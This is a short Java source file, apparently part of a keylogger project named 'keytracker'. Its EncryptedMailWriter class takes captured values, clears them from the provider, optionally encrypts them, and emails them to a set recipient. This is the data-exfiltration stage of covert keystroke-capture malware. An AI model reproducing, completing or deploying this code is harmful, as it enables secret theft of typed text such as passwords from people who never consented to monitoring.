package com.keytracker.file;

import com.keytracker.ValueProvider;
import com.keytracker.encrypt.Encryptor;
import com.keytracker.mail.MailSender;

public class EncryptedMailWriter extends MyMailWriter {

    private final Encryptor encryptor;

    public EncryptedMailWriter(MailSender mailSender, String to, Encryptor encryptor) {
        super(mailSender, to);
        this.encryptor = encryptor;
    }

    @Override
    public void write(ValueProvider valueProvider) {
        String value = getValueAndClear(valueProvider);
        mailSender.send(value, to);
    }

    private String getValueAndClear(ValueProvider valueProvider) {
        String extValue = valueProvider.extValue();
        valueProvider.clearExt();
        return encryptValue(extValue, encryptor);
    }

    private String encryptValue(String value, Encryptor encryptor) {
        return encryptor != null ? encryptor.encrypt(value) : value;
    }
}
